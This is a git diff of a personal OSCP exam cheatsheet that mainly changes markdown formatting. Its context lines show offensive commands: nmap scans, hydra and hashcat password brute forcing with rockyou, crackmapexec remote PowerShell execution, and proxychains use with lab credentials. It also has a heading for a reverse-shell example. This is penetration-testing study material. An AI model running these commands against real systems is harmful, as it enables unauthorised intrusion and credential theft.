@@ -1,9 +1,8 @@
 # OSCP exam cheatsheet (summary from my notes)
-_Eliot Roxbergh 2024_
+_Eliot Roxbergh for my OSCP exam 2024-02, I have yet to upload my complete notes but here is the summary I used for the exam._
 
-Search "tldr" for some checklists below.
-
-TIP: see "main tldr" and "linux tldr" and "ad tldr".
+Search "**tldr**" for some checklists below. \
+TIP: see "**main tldr**" and "**linux tldr**" and "**ad tldr**" below.
 
 
 ## Intro (start)
@@ -383,7 +382,7 @@ find / -perm -4000 -ls 2>/dev/null
 #		See script ../scripts/docker_build.sh
 ```
 
-- **How to see which process is using port?** \
+- **How to see which process is using port?**
 ```bash
 # See sockets / ports
 sudo netstat -tuln
@@ -395,7 +394,7 @@ sudo lsof -i :5432
 
 ### Overview Windows (windows tldr)
 
-- **Some overview steps** (TODO old / superfluous) \
+- **Some overview steps** (TODO old / superfluous)
 
 ```
 1. Try multiple initial compromise if stuck
@@ -487,7 +486,7 @@ crackmapexec smb ips.txt -u "$USER" -p "$PASS" -X '$shell = New-Object -ComObjec
 
 ### Windows
 
-- **Common ports** \
+- **Common ports**
 ```bash
 # Common Windows ports
 nmap -Pn -n --open -p 22,25,111,139,161,445,3389,5985,5986,47001,80,443,8000,8080,8443,2222 172.16.194.10
@@ -520,7 +519,7 @@ sudo echo; nmap -Pn -p- -T4 ms01 && sudo nmap -sU -T4 -A ms01 && nmap -Pn -A -p-
 ```
 
 
-- **Rev shell example (tunneling, priv esc)** \
+- **Rev shell example (tunneling, priv esc)**
 ```bash
 ## REV SHELL ##
 # Example rev shell
@@ -585,7 +584,7 @@ If you don't know exactly how the passwords look, use a standard list. If not fo
 hashcat -m MODE-HERE hashes.txt  /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force
 ```
 
-- **How to list files? (Get-ChildItem = gci)** (gci all) \
+- **How to list files? (Get-ChildItem = gci)** (gci all)
 ```powershell
 NOTE! for CMD you can also do:
 #dir /a
@@ -799,12 +798,12 @@ proxychains -q crackmapexec smb 172.16.111.6  -u jim -p Castello1!  --users
 
 External network:
 
-1. Enumerate network again (UDP & tcp) \
+1. Enumerate network again (UDP & tcp)
 ```bash
 # UDP: mainly check SNMP. THIS INCLUDES ON LINUX
 sudo nmap -sU  -p161 192.168.190.156
 ```
-3. CHECK FOR OLD VERSIONS (start /w `nmap -A`) -> exploit (e.g. searchsploit) \
+3. CHECK FOR OLD VERSIONS (start /w `nmap -A`) -> exploit (e.g. searchsploit)
 ```bash
 # enumerate smb
 sudo nmap -Pn -p139 -T4 --script "discovery and smb*" 192.168.236.145
@@ -836,7 +835,7 @@ proxychains -q hydra -l andrea -p 'PasswordPassword_6' -M ips.txt -t 1 rdp
 Internal (powershell):
 
 1. Check local files more thoroughly (`gci`-commands above are usually enough though --- e.g. note C:\\windows.old for SAM & SYSTEM, unusual programs, .. --- otherwise it's harder: e.g. list writable files/dirs and compare with running or restartable services)\
-2. Run winPEASx64 and seatbelt.exe, and double check \
+2. Run winPEASx64 and seatbelt.exe, and double check
 ```powershell
 # .\seatbelt.exe -group=all
 # These e.g. showed some that winPEAS missed
@@ -969,7 +968,7 @@ However this is perhaps subtly hinted at (note any that starts capitalized).
 
 ### Div
 
-- **FTP for reference** \
+- **FTP for reference**
 ```bash
 # Try anonymous login! (try to read and write)
 lftp 192.168.225.245 -u anonymous,
@@ -987,7 +986,7 @@ ftp anonymous@192.168.236.145: -p
 sudo hydra -t 10 -L test_users.txt -P /usr/share/wordlists/rockyou.txt 192.168.225.245 ftp 100
 ```
 
-- **Email for reference (pop3 imap smtp)** \
+- **Email for reference (pop3 imap smtp)**
 ```bash
 
 # Try VRFY usernames (no login)
@@ -1012,7 +1011,7 @@ tail /etc/proxychains4.conf -n5
 ```
 
 
-- **Q: It should be possible for socks proxy (e.g. Chisel) to tunnel DNS request** \
+- **Q: It should be possible for socks proxy (e.g. Chisel) to tunnel DNS request**
 ```
 According to https://posts.specterops.io/offensive-security-guide-to-ssh-tunnels-and-proxies-b525cbd4d4c6
 1. proxy_dns should already be enabled in /etc/proxychains4.conf
